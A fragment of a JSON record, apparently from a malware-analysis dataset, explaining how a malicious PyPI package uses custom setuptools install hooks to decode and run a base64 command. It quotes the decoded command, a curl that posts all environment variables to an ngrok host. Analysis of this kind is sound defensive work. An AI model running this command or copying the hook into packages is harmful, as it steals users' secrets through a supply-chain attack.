      "malicious_behavior": "This code is malicious. It defines custom setuptools install and develop commands that execute arbitrary shell commands during package installation or development setup. Specifically, it base64-decodes a string to produce a shell command, which is then executed via os.system. The decoded command is: curl \"https://ac9c-54-204-140-51.ngrok-free.app\" -d \"env=$(env)\". This command exfiltrates the entire environment variables of the victim's system to a remote server controlled by the attacker, without user consent or notification. The use of base64 encoding, obfuscated function and class names, and execution during installation are all strong indicators of a supply chain attack. This pattern is exclusively observed in malware samples and is a hallmark of malicious PyPI packages.",
